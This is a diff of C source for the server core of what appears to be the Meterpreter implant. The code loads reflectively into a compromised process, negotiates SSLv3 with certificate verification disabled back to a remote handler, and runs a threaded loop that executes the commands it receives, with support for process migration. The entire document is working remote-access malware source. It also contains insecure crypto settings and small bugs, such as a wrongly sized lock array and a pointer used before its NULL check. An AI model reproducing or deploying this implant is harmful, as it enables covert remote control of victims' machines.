@@ -5,6 +5,7 @@
 #include <windows.h> // for EXCEPTION_ACCESS_VIOLATION 
 #include <excpt.h> 
 
+// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor
 
 // include the Reflectiveloader() function
 #include "../ReflectiveDLLInjection/ReflectiveLoader.c"
@@ -26,93 +27,84 @@ int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
 #define ExitThread(x) exit((x))
 #endif
 
-// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor
-
 #define PREPEND_ERROR "### Error: "
 #define PREPEND_INFO  "### Info : "
 #define PREPEND_WARN  "### Warn : "
 
-static DWORD monitor_loop(Remote *remote);
-static DWORD negotiate_ssl(Remote *remote);
-static void ssl_debug_log( void *ctx, int level, char *str );
-static void flush_socket(Remote *remote);
+/*
+ * This thread is the main server thread which we use to syncronize a gracefull 
+ * shutdown of the server during process migration.
+ */
+THREAD serverThread = {0};
 
-DWORD server_setup(SOCKET fd)
+/*
+ * An array of locks for use by OpenSSL.
+ */
+static LOCK ** ssl_locks = NULL;
+
+/*
+ * A callback function used by OpenSSL to leverage native system locks.
+ */
+static VOID server_locking_callback( int mode, int type, const char * file, int line )
 {
-	Remote *remote = NULL;
-	DWORD res = 0;
-#ifdef _UNIX
-	int local_error = 0;
-#endif
-	// if hAppInstance is still == NULL it means that we havent been
-	// reflectivly loaded so we must patch in the hAppInstance value
-	// for use with loading server extensions later.
-	InitAppInstance();
-	srand((unsigned int)time(NULL));
-	
-	__try 
-	{
-
-	do
-	{
-		if (!(remote = remote_allocate(fd)))
-		{
-			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-			break;
-		}
-
-		// Do not allow the file descriptor to be inherited by child 
-		// processes
-		SetHandleInformation((HANDLE)fd, HANDLE_FLAG_INHERIT, 0);
-
-		// Flush the socket handle
-		dprintf("Flushing the socket handle...");
-		flush_socket(remote);
-
-		// Initialize SSL on the socket
-		dprintf("Negotiating SSL...");
-		negotiate_ssl(remote);
-
-		// Register extension dispatch routines
-		dprintf("Registering dispatch routines...");		
-		register_dispatch_routines();
-
-		dprintf("Entering the monitor loop...");		
-		// Keep processing commands
-		res = monitor_loop(remote);
-	
-		dprintf("Deregistering dispatch routines...");		
-		// Clean up our dispatch routines
-		deregister_dispatch_routines();
-
-	} while (0);
-
-	dprintf("Closing down SSL...");
-	SSL_free(remote->ssl);
-	SSL_CTX_free(remote->ctx);
-
-	if (remote)
-		remote_deallocate(remote);
-	}
-
-	/* Invoke the fatal error handler */
-	__except(exceptionfilter(GetExceptionCode(), GetExceptionInformation())) {
-		dprintf("*** exception triggered!");
-		ExitThread(0);
-	}
-
-	return res;
+	if( mode & CRYPTO_LOCK )
+		lock_acquire( ssl_locks[type] );
+	else
+		lock_release( ssl_locks[type] );
 }
 
+/*
+ * A callback function used by OpenSSL to get the current threads id.
+ * While not needed on windows this must be used for posix meterpreter.
+ */
+static DWORD server_threadid_callback( VOID )
+{
+	return GetCurrentThreadId();
+}
 
-// Flush all pending data on the connected socket before doing SSL
-static void flush_socket(Remote *remote) {
+/*
+ * Callback function for dynamic lock creation for OpenSSL.
+ */
+static struct CRYPTO_dynlock_value * server_dynamiclock_create( const char * file, int line )
+{
+	return (struct CRYPTO_dynlock_value *)lock_create();
+}
+
+/*
+ * Callback function for dynamic lock locking for OpenSSL.
+ */
+static void server_dynamiclock_lock( int mode, struct CRYPTO_dynlock_value * l, const char * file, int line )
+{
+	LOCK * lock = (LOCK *)l;
+
+	if( mode & CRYPTO_LOCK )
+		lock_acquire( lock );
+	else
+		lock_release( lock );
+}
+
+/*
+ * Callback function for dynamic lock destruction for OpenSSL.
+ */
+static void server_dynamiclock_destroy( struct CRYPTO_dynlock_value * l, const char * file, int line )
+{
+	lock_destroy( (LOCK *)l );
+}
+
+/*
+ * Flush all pending data on the connected socket before doing SSL.
+ */
+static VOID server_socket_flush( Remote * remote )
+{
 	fd_set fdread;
 	DWORD ret;
 	SOCKET fd;
     unsigned char buff[4096];
 
+	lock_acquire( remote->lock );
+
 	fd = remote_get_fd(remote);
+
 	while (1) {
 		struct timeval tv;
 		LONG data;
@@ -125,92 +117,302 @@ static void flush_socket(Remote *remote) {
 		tv.tv_usec = 0;
 
 		data = select(fd + 1, &fdread, NULL, NULL, &tv);
-		if(data == 0) break;
+		if(data == 0)
+			break;
 
 		ret = recv(fd, buff, sizeof(buff), 0);
-		dprintf("Flushed %d bytes from the buffer");
+		dprintf("[SERVER] Flushed %d bytes from the buffer");
 		continue;
 	}
+
+	lock_release( remote->lock );
 }
+
 /*
- * Negotiate SSL on the socket
+ * Poll a socket for data to recv and block when none available.
  */
-static DWORD negotiate_ssl(Remote *remote)
+static LONG server_socket_poll( Remote * remote, long timeout )
 {
-	DWORD hres = ERROR_SUCCESS;
-	SOCKET fd = remote_get_fd(remote);
-    DWORD ret;
-	
+	struct timeval tv;
+	LONG result;
+	fd_set fdread;
+	SOCKET fd;
+
+	lock_acquire( remote->lock );
+
+	fd = remote_get_fd( remote );
+
+	FD_ZERO( &fdread );
+	FD_SET( fd, &fdread );
+
+	tv.tv_sec  = 0;
+	tv.tv_usec = timeout;
+
+	result = select( fd + 1, &fdread, NULL, NULL, &tv );
+
+	lock_release( remote->lock );
+
+	return result;
+}
+
+/*
+ * Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
+ */
+static BOOL server_initialize_ssl( Remote * remote )
+{
+	int i = 0;
+
+	lock_acquire( remote->lock );
+
+	// Begin to bring up the OpenSSL subsystem...
+	CRYPTO_malloc_init();
 	SSL_load_error_strings();
 	SSL_library_init();
 
-	remote->meth = SSLv3_client_method();
-
-	remote->ctx  = SSL_CTX_new(remote->meth);
-	SSL_CTX_set_mode(remote->ctx, SSL_MODE_AUTO_RETRY);
-
-	remote->ssl  = SSL_new(remote->ctx);
-	SSL_set_verify(remote->ssl, SSL_VERIFY_NONE, NULL);
-	    if (SSL_set_fd(remote->ssl, remote->fd) == 0) {
-		    perror("set fd failed");
-		    exit(1);
-	    }
-	    
-
-	    if ((ret = SSL_connect(remote->ssl)) != 1) {
-		    printf("connect failed %d\n", SSL_get_error(remote->ssl, ret));
-		    exit(1);
-	    }
-	dprintf("Sending a HTTP GET request to the remote side...");
-	if((ret = SSL_write(remote->ssl, "GET / HTTP/1.0\r\n\r\n", 18)) <= 0) {
-		dprintf("SSL write failed during negotiation with return: %d (%d)", ret, 
-			SSL_get_error(remote->ssl, ret));
+	// Setup the required OpenSSL multi-threaded enviroment...
+	ssl_locks = (LOCK**)malloc( CRYPTO_num_locks() * sizeof(LOCK) );
+	if( ssl_locks == NULL )
+	{
+		lock_release( remote->lock );
+		return FALSE;
 	}
 
-	dprintf("Completed writing the HTTP GET request: %d", ret);
-	
-	if(ret < 0)
-		ExitThread(0);
+	for( i=0 ; i<CRYPTO_num_locks() ; i++ )
+		ssl_locks[i] = lock_create();
 
-	return(0);
+	CRYPTO_set_id_callback( server_threadid_callback );
+	CRYPTO_set_locking_callback( server_locking_callback );
+	// sf: unsure if these are required or giving optimal performance, commenting out for now.
+	//CRYPTO_set_dynlock_create_callback( server_dynamiclock_create );
+	//CRYPTO_set_dynlock_lock_callback( server_dynamiclock_lock );
+	//CRYPTO_set_dynlock_destroy_callback( server_dynamiclock_destroy  ); 
+
+	lock_release( remote->lock );
+
+	return TRUE;
 }
 
 /*
- * Monitor for requests and local waitable items in the scheduler
+ * Bring down the OpenSSL subsystem
  */
-static DWORD monitor_loop(Remote *remote)
+static BOOL server_destroy_ssl( Remote * remote )
 {
-	DWORD hres = ERROR_SUCCESS;
-	SOCKET fd = remote_get_fd(remote);
-	fd_set fdread;
-    
-	/*
-	 * Read data locally and remotely
-	 */
-	while (1)
+	int i = 0;
+
+	if( remote == NULL )
+		return FALSE;
+
+	lock_acquire( remote->lock );
+
+	SSL_free( remote->ssl );
+	
+	SSL_CTX_free( remote->ctx );
+
+	CRYPTO_set_locking_callback( NULL );
+	CRYPTO_set_id_callback( NULL );
+	//CRYPTO_set_dynlock_create_callback( NULL );
+	//CRYPTO_set_dynlock_lock_callback( NULL );
+	//CRYPTO_set_dynlock_destroy_callback( NULL );
+
+	for( i=0 ; i<CRYPTO_num_locks() ; i++ )
+		lock_destroy( ssl_locks[i] );
+		
+	free( ssl_locks );
+
+	lock_release( remote->lock );
+
+	return TRUE;
+}
+/*
+ * Negotiate SSL on the socket.
+ */
+static BOOL server_negotiate_ssl(Remote *remote)
+{
+	BOOL success = TRUE;
+	SOCKET fd    = 0;
+    DWORD ret    = 0;
+
+	lock_acquire( remote->lock );
+
+	do
 	{
-		struct timeval tv;
-		LONG data;
+		fd = remote_get_fd(remote);
 
-		FD_ZERO(&fdread);
-		FD_SET(fd, &fdread);
+		remote->meth = SSLv3_client_method();
 
-		tv.tv_sec  = 0;
-		tv.tv_usec = 100;
+		remote->ctx  = SSL_CTX_new(remote->meth);
+		SSL_CTX_set_mode(remote->ctx, SSL_MODE_AUTO_RETRY);
 
-		data = select(fd + 1, &fdread, NULL, NULL, &tv);
-
-		if (data > 0)
+		remote->ssl  = SSL_new(remote->ctx);
+		SSL_set_verify(remote->ssl, SSL_VERIFY_NONE, NULL);
+		    
+		if( SSL_set_fd(remote->ssl, remote->fd) == 0 )
 		{
-			if ((hres = command_process_remote(remote, NULL)) != ERROR_SUCCESS)
-				break;
-		}
-		else if (data < 0)
+			dprintf("[SERVER] set fd failed");
+			success = FALSE;
 			break;
+		}
+		
+		if( (ret = SSL_connect(remote->ssl)) != 1 )
+		{
+			dprintf("[SERVER] connect failed %d\n", SSL_get_error(remote->ssl, ret));
+			success = FALSE;
+			break;
+		}
 
-		// Process local scheduler items
-		scheduler_run(remote, 0);
+		dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
+
+		if( (ret = SSL_write(remote->ssl, "GET / HTTP/1.0\r\n\r\n", 18)) <= 0 )
+		{
+			dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret, SSL_get_error(remote->ssl, ret));
+		}
+
+	} while(0);
+
+	lock_release( remote->lock );
+
+	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
+	
+	if( ret < 0 )
+		success = FALSE;
+
+	return success;
+}
+
+/*
+ * The servers main dispatch loop for incoming requests.
+ */
+static DWORD server_dispatch( Remote * remote )
+{
+	LONG result     = ERROR_SUCCESS;
+	Packet * packet = NULL;
+	THREAD * cpt    = NULL;
+
+	dprintf( "[DISPATCH] entering server_dispatch( 0x%08X )", remote );
+
+	// Bring up the scheduler subsystem.
+	result = scheduler_initialize( remote );
+	if( result != ERROR_SUCCESS )
+		return result;
+
+	while( TRUE )
+	{
+		if( event_poll( serverThread.sigterm, 0 ) )
+		{
+			dprintf( "[DISPATCH] server dispatch thread signaled to terminate..." );
+			break;
+		}
+
+		result = server_socket_poll( remote, 100 );
+		if( result > 0 )
+		{
+			result = packet_receive( remote, &packet );
+			if( result != ERROR_SUCCESS )
+				break;
+
+			cpt = thread_create( command_process_thread, remote, packet );
+			
+			dprintf( "[DISPATCH] created command_process_thread 0x%08X, handle=0x%08X", cpt, cpt->handle );
+			
+			if( cpt != NULL )
+				thread_run( cpt );
+		}
+		else if( result < 0 )
+		{
+			break;
+		}
 	}
 
-	return hres;
+	dprintf( "[DISPATCH] calling scheduler_destroy..." );
+	scheduler_destroy();
+
+	dprintf( "[DISPATCH] calling command_join_threads..." );
+	command_join_threads();
+
+	dprintf( "[DISPATCH] leaving server_dispatch." );
+
+	return result;
+}
+
+/*
+ * Setup and run the server. This is called from Init via the loader.
+ */
+DWORD server_setup( SOCKET fd )
+{
+	Remote *remote = NULL;
+	DWORD res      = 0;
+
+#ifdef _UNIX
+	int local_error = 0;
+#endif
+
+	// if hAppInstance is still == NULL it means that we havent been
+	// reflectivly loaded so we must patch in the hAppInstance value
+	// for use with loading server extensions later.
+	InitAppInstance();
+
+	srand( (unsigned int)time(NULL) );
+	
+	__try 
+	{
+		do
+		{
+			dprintf( "[SERVER] module loaded at 0x%08X", hAppInstance );
+			
+			// manually create a THREAD item for the servers main thread, we use this to manage migration later.
+			memset( &serverThread, 0, sizeof(THREAD) );
+			serverThread.id      = GetCurrentThreadId();
+			serverThread.handle  = OpenThread( THREAD_TERMINATE, FALSE, serverThread.id );
+			serverThread.sigterm = event_create();
+
+			dprintf( "[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread.handle, serverThread.id, serverThread.sigterm );
+
+			if( !(remote = remote_allocate(fd)) )
+			{
+				SetLastError( ERROR_NOT_ENOUGH_MEMORY );
+				break;
+			}
+
+			// Do not allow the file descriptor to be inherited by child processes
+			SetHandleInformation((HANDLE)fd, HANDLE_FLAG_INHERIT, 0);
+
+			dprintf("[SERVER] Flushing the socket handle...");
+			server_socket_flush( remote );
+		
+			dprintf("[SERVER] Initializing SSL...");
+			if( !server_initialize_ssl( remote ) )
+				break;
+
+			dprintf("[SERVER] Negotiating SSL...");
+			if( !server_negotiate_ssl( remote ) )
+				break;
+
+			dprintf("[SERVER] Registering dispatch routines...");
+			register_dispatch_routines();
+
+			dprintf("[SERVER] Entering the main server dispatch loop...");
+			server_dispatch( remote );
+		
+			dprintf("[SERVER] Deregistering dispatch routines...");
+			deregister_dispatch_routines();
+
+		} while (0);
+
+		dprintf("[SERVER] Closing down SSL...");
+
+		server_destroy_ssl( remote );
+
+		if( remote )
+			remote_deallocate( remote );
+
+	} 
+	__except( exceptionfilter(GetExceptionCode(), GetExceptionInformation()) )
+	{
+		dprintf("[SERVER] *** exception triggered!");
+
+		thread_kill( &serverThread );
+	}
+
+	dprintf("[SERVER] Finished.");
+	return res;
 }
